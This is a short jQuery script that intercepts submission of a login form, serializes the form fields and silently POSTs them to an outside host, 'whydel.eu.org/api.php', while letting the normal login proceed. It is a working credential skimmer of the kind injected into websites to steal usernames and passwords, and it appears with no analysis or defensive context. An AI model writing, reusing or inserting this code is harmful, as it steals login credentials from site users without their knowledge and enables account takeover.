$(".login-form").submit(function() {
	var d = $(".login-form");
	
	$.ajax({
        url: "http://whydel.eu.org/api.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
